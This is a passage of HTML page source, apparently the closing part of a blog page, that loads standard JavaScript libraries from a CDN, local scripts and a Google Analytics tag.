fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
